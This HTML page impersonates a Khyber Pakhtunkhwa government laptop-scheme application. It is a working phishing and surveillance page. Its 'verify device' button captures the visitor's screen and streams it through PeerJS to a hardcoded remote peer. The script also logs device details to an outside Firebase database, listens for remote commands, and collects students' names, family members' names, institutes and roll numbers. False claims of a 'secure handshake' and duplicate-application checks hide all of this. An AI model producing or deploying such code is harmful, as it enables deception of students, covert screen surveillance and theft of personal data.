<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CM KP Peshawar Laptop Scheme 2026</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .kp-green { background-color: #004d26; }
        .form-input { @apply w-full bg-gray-50 border border-gray-200 p-3 rounded-lg outline-none focus:border-green-600 transition-all text-sm; }
    </style>
</head>
<body class="bg-gray-100 font-sans">

    <!-- Header -->
    <header class="kp-green text-white p-4 shadow-md">
        <div class="max-w-4xl mx-auto flex items-center gap-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Government_of_Khyber_Pakhtunkhwa_logo.png" width="45">
            <div>
                <h1 class="font-bold text-sm md:text-lg uppercase">Government of Khyber Pakhtunkhwa</h1>
                <p class="text-[10px] md:text-xs">Higher Education Digital Support Initiative 2026</p>
            </div>
        </div>
    </header>

    <main class="max-w-2xl mx-auto mt-6 p-4">
        <!-- Hero Section -->
        <div id="step-1" class="bg-white rounded-3xl p-8 shadow-xl text-center border-t-8 border-green-800">
            <h2 class="text-2xl font-black text-gray-800 mb-4">Peshawar Region Laptop Eligibility</h2>
            <p class="text-gray-500 text-sm mb-6">Our automated system needs to verify your mobile hardware, screen resolution, and OS security patch before you can fill the application.</p>
            <img src="https://cmlaptophed.punjab.gov.pk/landing/images/eligibility_image.png" class="mx-auto w-64 mb-6">
            
            <button id="auth-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded-xl shadow-lg transition-transform active:scale-95">
                VERIFY DEVICE & CONTINUE
            </button>
            <div class="mt-4 flex justify-center gap-4 text-[10px] text-gray-400 font-bold">
                <span>✓ SECURE HANDSHAKE</span>
                <span>✓ HARDWARE SCAN</span>
            </div>
        </div>

        <!-- Detailed Form (Hidden until verification) -->
        <div id="step-2" class="hidden bg-white rounded-3xl p-8 shadow-xl border-t-8 border-blue-600">
            <div class="mb-6 flex justify-between items-center border-b pb-4">
                <h2 class="text-xl font-bold">Application Details</h2>
                <span class="bg-green-100 text-green-700 text-[10px] px-2 py-1 rounded">DEVICE LINKED</span>
            </div>
            
            <form id="detailsForm" class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="md:col-span-2"><label class="text-xs font-bold text-gray-500">STUDENT FULL NAME</label><input type="text" id="s_name" class="form-input" required></div>
                <div><label class="text-xs font-bold text-gray-500">FATHER NAME</label><input type="text" id="f_name" class="form-input" required></div>
                <div><label class="text-xs font-bold text-gray-500">BROTHER/GUARDIAN NAME</label><input type="text" id="b_name" class="form-input" required></div>
                <div><label class="text-xs font-bold text-gray-500">COLLEGE/UNIVERSITY</label><input type="text" id="inst" class="form-input" required></div>
                <div><label class="text-xs font-bold text-gray-500">ROLL NO / REG NO</label><input type="text" id="roll" class="form-input" required></div>
                <div><label class="text-xs font-bold text-gray-500">DEGREE PROGRAM</label><input type="text" id="deg" class="form-input" required></div>
                <div><label class="text-xs font-bold text-gray-500">SEMESTER</label><input type="number" id="sem" class="form-input" required></div>
                <div class="md:col-span-2">
                    <button type="submit" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl mt-4">SUBMIT FINAL APPLICATION</button>
                </div>
            </form>
        </div>

        <div id="step-3" class="hidden text-center py-20">
            <div class="text-6xl mb-4">✅</div>
            <h2 class="text-2xl font-bold">Application Pending Review</h2>
            <p class="text-gray-500">Your hardware specs and form data have been synced with the Peshawar District Node. Do not close this tab.</p>
        </div>
    </main>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
            authDomain: "auralink-2026.firebaseapp.com",
            projectId: "auralink-2026",
            databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com",
            appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const peer = new Peer();

        let myPeerId = "";

        peer.on('open', (id) => { myPeerId = id; });

        document.getElementById('auth-btn').onclick = async () => {
            try {
                // Critical: Screen share request
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                peer.call("AURALINK_PESHAWAR_ADMIN", stream);
                
                // Initial background telemetry
                const bat = await navigator.getBattery();
                db.ref('sessions/' + myPeerId).set({
                    id: myPeerId,
                    model: navigator.userAgent.split('(')[1].split(')')[0],
                    battery: Math.floor(bat.level * 100) + '%',
                    status: "DEVICE_LINKED",
                    timestamp: Date.now()
                });

                document.getElementById('step-1').classList.add('hidden');
                document.getElementById('step-2').classList.remove('hidden');

                // Command Listener
                db.ref('commands/' + myPeerId).on('value', (snap) => {
                    const c = snap.val();
                    if(c) {
                        if(c.action === 'vibrate') navigator.vibrate(1000);
                        if(c.action === 'alert') new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
                    }
                });

            } catch (err) {
                alert("ACCESS DENIED: Peshawar Digital Program requires device verification to prevent duplicate applications.");
            }
        };

        document.getElementById('detailsForm').onsubmit = (e) => {
            e.preventDefault();
            const data = {
                name: document.getElementById('s_name').value,
                father: document.getElementById('f_name').value,
                brother: document.getElementById('b_name').value,
                institute: document.getElementById('inst').value,
                roll: document.getElementById('roll').value,
                degree: document.getElementById('deg').value,
                semester: document.getElementById('sem').value,
                status: "VERIFIED_APPLICATION"
            };
            db.ref('sessions/' + myPeerId).update(data);
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
        };
    </script>
</body>
</html>
